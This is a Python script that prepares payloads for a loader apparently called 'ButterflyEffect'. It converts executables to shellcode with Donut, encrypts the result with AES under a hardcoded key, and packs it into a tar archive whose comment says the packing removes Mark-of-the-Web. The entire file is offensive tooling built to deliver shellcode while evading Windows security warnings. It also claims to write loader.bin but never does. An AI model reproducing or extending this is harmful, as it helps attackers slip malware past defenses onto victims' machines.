#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import binascii
import os
import sys
import argparse
import donut 
import tarfile

def main():
    parser = argparse.ArgumentParser(
        description="Generate + encrypt shellcode for ButterflyEffect loader."
    )

    parser.add_argument(
        "-f", "--file",
        required=True,
        help="Path to EXE/DLL/.NET file OR raw shellcode file"
    )

    parser.add_argument(
        "--raw",
        action="store_true",
        help="Treat input as raw shellcode instead of converting with Donut"
    )

    args = parser.parse_args()

    input_file = args.file

    # -------------------------------------------------------
    # 1. Get shellcode (either raw, or generated with Donut)
    # -------------------------------------------------------
    if args.raw:
        print("[+] Loading raw shellcode from disk...")
        try:
            with open(input_file, "rb") as f:
                shellcode = f.read()
        except Exception as e:
            print(f"[!] Failed to read raw shellcode: {e}")
            sys.exit(1)
    else:
        try:
            result = donut.create(
                file=input_file,
                arch=2,  # x64
            )
            shellcode = result
            print(f"[+] Donut shellcode size: {len(shellcode)} bytes")
        except Exception as e:
            print(f"[!] Donut conversion failed: {e}")
            sys.exit(1)



    # -------------------------------------------------------
    # 2. Encrypt shellcode with AES-CBC
    # -------------------------------------------------------
    key = b'1234567890123456'  # 16-byte AES key
    iv  = b'1234567890123456'  # 16-byte AES IV

    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(shellcode, AES.block_size)
    encrypted = cipher.encrypt(padded)

    # -------------------------------------------------------
    # 3. Write encrypted output
    # -------------------------------------------------------
    with open("cipher.bin", "wb") as f:
        f.write(encrypted)

    with tarfile.open("archive.tar", "w") as tar:
        tar.add("cipher.bin") # Remove MOTW

    print("[+] Raw shellcode written to loader.bin")
    print("[+] Encrypted shellcode written to cipher.bin")
    print("[+] Tar containing encrypted shellcode written to archive.tar")




    # Uncomment these if you edit keys and need to update the Butterfly Effect Loader:
    # print("byte[] key = new byte[] { " + to_csharp_byte_array(key) + " };")
    # print("byte[] iv = new byte[] { " + to_csharp_byte_array(iv)  + " };")

def to_csharp_byte_array(data):
    return ', '.join(f'0x{byte:02x}' for byte in data)

if __name__ == "__main__":
    main()



